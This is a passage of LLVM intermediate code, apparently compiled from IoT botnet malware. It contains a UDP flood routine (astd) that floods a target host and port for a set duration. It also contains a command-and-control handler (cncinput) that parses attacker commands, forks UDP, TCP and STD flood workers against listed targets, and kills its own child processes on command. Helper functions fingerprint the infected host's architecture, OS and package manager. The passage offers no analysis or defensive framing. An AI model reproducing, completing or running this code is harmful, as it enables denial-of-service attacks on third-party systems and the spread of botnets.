  %322 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %323 = load i32, i32* %24, align 4
  %324 = icmp sgt i32 %322, %323
  br i1 %324, label %325, label %326

; <label>:325:                                    ; preds = %321
  br label %330

; <label>:326:                                    ; preds = %321
  store i32 0, i32* %25, align 4
  br label %274

; <label>:327:                                    ; preds = %275
  %328 = load i32, i32* %25, align 4
  %329 = add i32 %328, 1
  store i32 %329, i32* %25, align 4
  br label %274

; <label>:330:                                    ; preds = %325
  %331 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %331)
  br label %332

; <label>:332:                                    ; preds = %330, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @astd(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca [1 x i8*], align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %15, i32* %9, align 4
  %16 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %17 = sext i32 %16 to i64
  store i64 %17, i64* %10, align 8
  %18 = load i8*, i8** %5, align 8
  %19 = call %struct.hostent* @gethostbyname(i8* %18)
  store %struct.hostent* %19, %struct.hostent** %12, align 8
  %20 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 16, i32 4, i1 false)
  %21 = load %struct.hostent*, %struct.hostent** %12, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 4
  %23 = load i8**, i8*** %22, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %27 = bitcast %struct.in_addr* %26 to i8*
  %28 = load %struct.hostent*, %struct.hostent** %12, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 3
  %30 = load i32, i32* %29, align 4
  %31 = sext i32 %30 to i64
  call void @bcopy(i8* %25, i8* %27, i64 %31) #6
  %32 = load %struct.hostent*, %struct.hostent** %12, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %35, i16* %36, align 4
  %37 = load i32, i32* %6, align 4
  %38 = trunc i32 %37 to i16
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 0, i32* %13, align 4
  br label %40

; <label>:40:                                     ; preds = %65, %4
  %41 = bitcast [1 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %41, i8* bitcast ([1 x i8*]* @astd.hexstring to i8*), i64 8, i32 8, i1 false)
  %42 = load i32, i32* %13, align 4
  %43 = icmp uge i32 %42, 50
  br i1 %43, label %44, label %65

; <label>:44:                                     ; preds = %40
  %45 = load i32, i32* %9, align 4
  %46 = getelementptr inbounds [1 x i8*], [1 x i8*]* %14, i32 0, i32 0
  %47 = bitcast i8** %46 to i8*
  %48 = load i32, i32* %8, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @send(i32 %45, i8* %47, i64 %49, i32 0)
  %51 = load i32, i32* %9, align 4
  %52 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = sext i32 %54 to i64
  %56 = load i64, i64* %10, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = add nsw i64 %56, %58
  %60 = icmp sge i64 %55, %59
  br i1 %60, label %61, label %64

; <label>:61:                                     ; preds = %44
  %62 = load i32, i32* %9, align 4
  %63 = call i32 @close(i32 %62)
  call void @_exit(i32 0) #11
  unreachable

; <label>:64:                                     ; preds = %44
  store i32 0, i32* %13, align 4
  br label %65

; <label>:65:                                     ; preds = %64, %40
  %66 = load i32, i32* %13, align 4
  %67 = add i32 %66, 1
  store i32 %67, i32* %13, align 4
  br label %40
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i8* @defarchs() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @defopsys() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @defpkgs() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.14, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.16, i32 0, i32 0), i32 0) #6
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %5
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:9:                                      ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.18, i32 0, i32 0), i32 0) #6
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.19, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:13:                                     ; preds = %9
  %14 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.20, i32 0, i32 0), i32 0) #6
  %15 = icmp ne i32 %14, -1
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %13
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:17:                                     ; preds = %13
  %18 = call i32 @access(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i32 0) #6
  %19 = icmp ne i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %17
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:21:                                     ; preds = %17
  %22 = call i32 @access(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i32 0) #6
  %23 = icmp ne i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %21
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:25:                                     ; preds = %21
  %26 = call i32 @access(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i32 0) #6
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.27, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:29:                                     ; preds = %25
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.28, i32 0, i32 0), i8** %1, align 8
  br label %30

; <label>:30:                                     ; preds = %29, %28, %24, %20, %16, %12, %8, %4
  %31 = load i8*, i8** %1, align 8
  ret i8* %31
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @cncinput(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %27 = load i8**, i8*** %4, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #10
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %151, label %32

; <label>:32:                                     ; preds = %2
  %33 = load i32, i32* %3, align 4
  %34 = icmp slt i32 %33, 6
  br i1 %34, label %86, label %35

; <label>:35:                                     ; preds = %32
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 3
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38) #10
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %86, label %41

; <label>:41:                                     ; preds = %35
  %42 = load i8**, i8*** %4, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 2
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @atoi(i8* %44) #10
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %86, label %47

; <label>:47:                                     ; preds = %41
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 4
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @atoi(i8* %50) #10
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %86, label %53

; <label>:53:                                     ; preds = %47
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 5
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @atoi(i8* %56) #10
  %58 = icmp eq i32 %57, -1
  br i1 %58, label %86, label %59

; <label>:59:                                     ; preds = %53
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 5
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @atoi(i8* %62) #10
  %64 = icmp sgt i32 %63, 65536
  br i1 %64, label %86, label %65

; <label>:65:                                     ; preds = %59
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 5
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @atoi(i8* %68) #10
  %70 = icmp sgt i32 %69, 65500
  br i1 %70, label %86, label %71

; <label>:71:                                     ; preds = %65
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 4
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @atoi(i8* %74) #10
  %76 = icmp sgt i32 %75, 32
  br i1 %76, label %86, label %77

; <label>:77:                                     ; preds = %71
  %78 = load i32, i32* %3, align 4
  %79 = icmp eq i32 %78, 7
  br i1 %79, label %80, label %87

; <label>:80:                                     ; preds = %77
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 6
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @atoi(i8* %83) #10
  %85 = icmp slt i32 %84, 1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %80, %71, %65, %59, %53, %47, %41, %35, %32
  br label %394

; <label>:87:                                     ; preds = %80, %77
  %88 = load i8**, i8*** %4, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  store i8* %90, i8** %5, align 8
  %91 = load i8**, i8*** %4, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 2
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @atoi(i8* %93) #10
  store i32 %94, i32* %6, align 4
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 3
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #10
  store i32 %98, i32* %7, align 4
  %99 = load i8**, i8*** %4, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 4
  %101 = load i8*, i8** %100, align 8
  %102 = call i32 @atoi(i8* %101) #10
  store i32 %102, i32* %8, align 4
  %103 = load i8**, i8*** %4, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 5
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105) #10
  store i32 %106, i32* %9, align 4
  %107 = load i32, i32* %3, align 4
  %108 = icmp sgt i32 %107, 6
  br i1 %108, label %109, label %114

; <label>:109:                                    ; preds = %87
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 6
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #10
  br label %115

; <label>:114:                                    ; preds = %87
  br label %115

; <label>:115:                                    ; preds = %114, %109
  %116 = phi i32 [ %113, %109 ], [ 1000, %114 ]
  store i32 %116, i32* %10, align 4
  %117 = load i8*, i8** %5, align 8
  %118 = call i8* @strstr(i8* %117, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %119 = icmp ne i8* %118, null
  br i1 %119, label %120, label %139

; <label>:120:                                    ; preds = %115
  %121 = load i8*, i8** %5, align 8
  %122 = call i8* @strtok(i8* %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %122, i8** %11, align 8
  br label %123

; <label>:123:                                    ; preds = %136, %120
  %124 = load i8*, i8** %11, align 8
  %125 = icmp ne i8* %124, null
  br i1 %125, label %126, label %138

; <label>:126:                                    ; preds = %123
  %127 = call i32 @listFork()
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %136, label %129

; <label>:129:                                    ; preds = %126
  %130 = load i8*, i8** %11, align 8
  %131 = load i32, i32* %6, align 4
  %132 = load i32, i32* %7, align 4
  %133 = load i32, i32* %8, align 4
  %134 = load i32, i32* %9, align 4
  %135 = load i32, i32* %10, align 4
  call void @audp(i8* %130, i32 %131, i32 %132, i32 %133, i32 %134, i32 %135)
  call void @_exit(i32 0) #11
  unreachable

; <label>:136:                                    ; preds = %126
  %137 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %137, i8** %11, align 8
  br label %123

; <label>:138:                                    ; preds = %123
  br label %150

; <label>:139:                                    ; preds = %115
  %140 = call i32 @listFork()
  %141 = icmp ne i32 %140, 0
  br i1 %141, label %149, label %142

; <label>:142:                                    ; preds = %139
  %143 = load i8*, i8** %5, align 8
  %144 = load i32, i32* %6, align 4
  %145 = load i32, i32* %7, align 4
  %146 = load i32, i32* %8, align 4
  %147 = load i32, i32* %9, align 4
  %148 = load i32, i32* %10, align 4
  call void @audp(i8* %143, i32 %144, i32 %145, i32 %146, i32 %147, i32 %148)
  call void @_exit(i32 0) #11
  unreachable

; <label>:149:                                    ; preds = %139
  br label %150

; <label>:150:                                    ; preds = %149, %138
  br label %394

; <label>:151:                                    ; preds = %2
  %152 = load i8**, i8*** %4, align 8
  %153 = getelementptr inbounds i8*, i8** %152, i64 0
  %154 = load i8*, i8** %153, align 8
  %155 = call i32 @strcmp(i8* %154, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.30, i32 0, i32 0)) #10
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %278, label %157

; <label>:157:                                    ; preds = %151
  %158 = load i32, i32* %3, align 4
  %159 = icmp slt i32 %158, 6
  br i1 %159, label %202, label %160

; <label>:160:                                    ; preds = %157
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 3
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #10
  %165 = icmp eq i32 %164, -1
  br i1 %165, label %202, label %166

; <label>:166:                                    ; preds = %160
  %167 = load i8**, i8*** %4, align 8
  %168 = getelementptr inbounds i8*, i8** %167, i64 2
  %169 = load i8*, i8** %168, align 8
  %170 = call i32 @atoi(i8* %169) #10
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %202, label %172

; <label>:172:                                    ; preds = %166
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 4
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @atoi(i8* %175) #10
  %177 = icmp eq i32 %176, -1
  br i1 %177, label %202, label %178

; <label>:178:                                    ; preds = %172
  %179 = load i8**, i8*** %4, align 8
  %180 = getelementptr inbounds i8*, i8** %179, i64 4
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 @atoi(i8* %181) #10
  %183 = icmp sgt i32 %182, 32
  br i1 %183, label %202, label %184

; <label>:184:                                    ; preds = %178
  %185 = load i32, i32* %3, align 4
  %186 = icmp sgt i32 %185, 6
  br i1 %186, label %187, label %193

; <label>:187:                                    ; preds = %184
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 6
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #10
  %192 = icmp slt i32 %191, 0
  br i1 %192, label %202, label %193

; <label>:193:                                    ; preds = %187, %184
  %194 = load i32, i32* %3, align 4
  %195 = icmp eq i32 %194, 8
  br i1 %195, label %196, label %203

; <label>:196:                                    ; preds = %193
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 7
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #10
  %201 = icmp slt i32 %200, 1
  br i1 %201, label %202, label %203

; <label>:202:                                    ; preds = %196, %187, %178, %172, %166, %160, %157
  br label %394

; <label>:203:                                    ; preds = %196, %193
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 1
  %206 = load i8*, i8** %205, align 8
  store i8* %206, i8** %12, align 8
  %207 = load i8**, i8*** %4, align 8
  %208 = getelementptr inbounds i8*, i8** %207, i64 2
  %209 = load i8*, i8** %208, align 8
  %210 = call i32 @atoi(i8* %209) #10
  store i32 %210, i32* %13, align 4
  %211 = load i8**, i8*** %4, align 8
  %212 = getelementptr inbounds i8*, i8** %211, i64 3
  %213 = load i8*, i8** %212, align 8
  %214 = call i32 @atoi(i8* %213) #10
  store i32 %214, i32* %14, align 4
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 4
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* %217) #10
  store i32 %218, i32* %15, align 4
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 5
  %221 = load i8*, i8** %220, align 8
  store i8* %221, i8** %16, align 8
  %222 = load i32, i32* %3, align 4
  %223 = icmp eq i32 %222, 8
  br i1 %223, label %224, label %229

; <label>:224:                                    ; preds = %203
  %225 = load i8**, i8*** %4, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 7
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 @atoi(i8* %227) #10
  br label %230

; <label>:229:                                    ; preds = %203
  br label %230

; <label>:230:                                    ; preds = %229, %224
  %231 = phi i32 [ %228, %224 ], [ 10, %229 ]
  store i32 %231, i32* %17, align 4
  %232 = load i32, i32* %3, align 4
  %233 = icmp sgt i32 %232, 6
  br i1 %233, label %234, label %239

; <label>:234:                                    ; preds = %230
  %235 = load i8**, i8*** %4, align 8
  %236 = getelementptr inbounds i8*, i8** %235, i64 6
  %237 = load i8*, i8** %236, align 8
  %238 = call i32 @atoi(i8* %237) #10
  br label %240

; <label>:239:                                    ; preds = %230
  br label %240

; <label>:240:                                    ; preds = %239, %234
  %241 = phi i32 [ %238, %234 ], [ 0, %239 ]
  store i32 %241, i32* %18, align 4
  %242 = load i8*, i8** %12, align 8
  %243 = call i8* @strstr(i8* %242, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %244 = icmp ne i8* %243, null
  br i1 %244, label %245, label %265

; <label>:245:                                    ; preds = %240
  %246 = load i8*, i8** %12, align 8
  %247 = call i8* @strtok(i8* %246, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %247, i8** %19, align 8
  br label %248

; <label>:248:                                    ; preds = %262, %245
  %249 = load i8*, i8** %19, align 8
  %250 = icmp ne i8* %249, null
  br i1 %250, label %251, label %264

; <label>:251:                                    ; preds = %248
  %252 = call i32 @listFork()
  %253 = icmp ne i32 %252, 0
  br i1 %253, label %262, label %254

; <label>:254:                                    ; preds = %251
  %255 = load i8*, i8** %19, align 8
  %256 = load i32, i32* %13, align 4
  %257 = load i32, i32* %14, align 4
  %258 = load i32, i32* %15, align 4
  %259 = load i8*, i8** %16, align 8
  %260 = load i32, i32* %18, align 4
  %261 = load i32, i32* %17, align 4
  call void @atcp(i8* %255, i32 %256, i32 %257, i32 %258, i8* %259, i32 %260, i32 %261)
  call void @_exit(i32 0) #11
  unreachable

; <label>:262:                                    ; preds = %251
  %263 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %263, i8** %19, align 8
  br label %248

; <label>:264:                                    ; preds = %248
  br label %277

; <label>:265:                                    ; preds = %240
  %266 = call i32 @listFork()
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %276, label %268

; <label>:268:                                    ; preds = %265
  %269 = load i8*, i8** %12, align 8
  %270 = load i32, i32* %13, align 4
  %271 = load i32, i32* %14, align 4
  %272 = load i32, i32* %15, align 4
  %273 = load i8*, i8** %16, align 8
  %274 = load i32, i32* %18, align 4
  %275 = load i32, i32* %17, align 4
  call void @atcp(i8* %269, i32 %270, i32 %271, i32 %272, i8* %273, i32 %274, i32 %275)
  call void @_exit(i32 0) #11
  unreachable

; <label>:276:                                    ; preds = %265
  br label %277

; <label>:277:                                    ; preds = %276, %264
  br label %394

; <label>:278:                                    ; preds = %151
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds i8*, i8** %279, i64 0
  %281 = load i8*, i8** %280, align 8
  %282 = call i32 @strcmp(i8* %281, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0)) #10
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %352, label %284

; <label>:284:                                    ; preds = %278
  %285 = load i32, i32* %3, align 4
  %286 = icmp slt i32 %285, 4
  br i1 %286, label %305, label %287

; <label>:287:                                    ; preds = %284
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 2
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @atoi(i8* %290) #10
  %292 = icmp slt i32 %291, 1
  br i1 %292, label %305, label %293

; <label>:293:                                    ; preds = %287
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 3
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @atoi(i8* %296) #10
  %298 = icmp slt i32 %297, 1
  br i1 %298, label %305, label %299

; <label>:299:                                    ; preds = %293
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 4
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @atoi(i8* %302) #10
  %304 = icmp slt i32 %303, 1
  br i1 %304, label %305, label %306

; <label>:305:                                    ; preds = %299, %293, %287, %284
  br label %394

; <label>:306:                                    ; preds = %299
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 1
  %309 = load i8*, i8** %308, align 8
  store i8* %309, i8** %20, align 8
  %310 = load i8**, i8*** %4, align 8
  %311 = getelementptr inbounds i8*, i8** %310, i64 2
  %312 = load i8*, i8** %311, align 8
  %313 = call i32 @atoi(i8* %312) #10
  store i32 %313, i32* %21, align 4
  %314 = load i8**, i8*** %4, align 8
  %315 = getelementptr inbounds i8*, i8** %314, i64 3
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 @atoi(i8* %316) #10
  store i32 %317, i32* %22, align 4
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 4
  %320 = load i8*, i8** %319, align 8
  %321 = call i32 @atoi(i8* %320) #10
  store i32 %321, i32* %23, align 4
  %322 = load i8*, i8** %20, align 8
  %323 = call i8* @strstr(i8* %322, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %324 = icmp ne i8* %323, null
  br i1 %324, label %325, label %342

; <label>:325:                                    ; preds = %306
  %326 = load i8*, i8** %20, align 8
  %327 = call i8* @strtok(i8* %326, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %327, i8** %24, align 8
  br label %328

; <label>:328:                                    ; preds = %339, %325
  %329 = load i8*, i8** %24, align 8
  %330 = icmp ne i8* %329, null
  br i1 %330, label %331, label %341

; <label>:331:                                    ; preds = %328
  %332 = call i32 @listFork()
  %333 = icmp ne i32 %332, 0
  br i1 %333, label %339, label %334

; <label>:334:                                    ; preds = %331
  %335 = load i8*, i8** %24, align 8
  %336 = load i32, i32* %21, align 4
  %337 = load i32, i32* %22, align 4
  %338 = load i32, i32* %23, align 4
  call void @astd(i8* %335, i32 %336, i32 %337, i32 %338)
  call void @_exit(i32 0) #11
  unreachable

; <label>:339:                                    ; preds = %331
  %340 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %340, i8** %24, align 8
  br label %328

; <label>:341:                                    ; preds = %328
  br label %351

; <label>:342:                                    ; preds = %306
  %343 = call i32 @listFork()
  %344 = icmp ne i32 %343, 0
  br i1 %344, label %345, label %346

; <label>:345:                                    ; preds = %342
  br label %394

; <label>:346:                                    ; preds = %342
  %347 = load i8*, i8** %20, align 8
  %348 = load i32, i32* %21, align 4
  %349 = load i32, i32* %22, align 4
  %350 = load i32, i32* %23, align 4
  call void @astd(i8* %347, i32 %348, i32 %349, i32 %350)
  call void @_exit(i32 0) #11
  unreachable

; <label>:351:                                    ; preds = %341
  br label %352

; <label>:352:                                    ; preds = %351, %278
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 0
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @strcmp(i8* %355, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0)) #10
  %357 = icmp ne i32 %356, 0
  br i1 %357, label %394, label %358

; <label>:358:                                    ; preds = %352
  store i32 0, i32* %25, align 4
  store i64 0, i64* %26, align 8
  br label %359

; <label>:359:                                    ; preds = %385, %358
  %360 = load i64, i64* %26, align 8
  %361 = load i64, i64* @numpids, align 8
  %362 = icmp ult i64 %360, %361
  br i1 %362, label %363, label %388

; <label>:363:                                    ; preds = %359
  %364 = load i32*, i32** @pids, align 8
  %365 = load i64, i64* %26, align 8
  %366 = getelementptr inbounds i32, i32* %364, i64 %365
  %367 = load i32, i32* %366, align 4
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %369, label %384

; <label>:369:                                    ; preds = %363
  %370 = load i32*, i32** @pids, align 8
  %371 = load i64, i64* %26, align 8
  %372 = getelementptr inbounds i32, i32* %370, i64 %371
  %373 = load i32, i32* %372, align 4
  %374 = call i32 @getpid() #6
  %375 = icmp ne i32 %373, %374
  br i1 %375, label %376, label %384

; <label>:376:                                    ; preds = %369
  %377 = load i32*, i32** @pids, align 8
  %378 = load i64, i64* %26, align 8
  %379 = getelementptr inbounds i32, i32* %377, i64 %378
  %380 = load i32, i32* %379, align 4
  %381 = call i32 @kill(i32 %380, i32 9) #6
  %382 = load i32, i32* %25, align 4
  %383 = add nsw i32 %382, 1
  store i32 %383, i32* %25, align 4
  br label %384

; <label>:384:                                    ; preds = %376, %369, %363
  br label %385

; <label>:385:                                    ; preds = %384
  %386 = load i64, i64* %26, align 8
  %387 = add i64 %386, 1
  store i64 %387, i64* %26, align 8
  br label %359

; <label>:388:                                    ; preds = %359
  %389 = load i32, i32* %25, align 4
  %390 = icmp sgt i32 %389, 0
  br i1 %390, label %391, label %392

; <label>:391:                                    ; preds = %388
  br label %393

; <label>:392:                                    ; preds = %388
  br label %393

; <label>:393:                                    ; preds = %392, %391
  br label %394

; <label>:394:                                    ; preds = %393, %352, %345, %305, %277, %202, %150, %86
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: nounwind
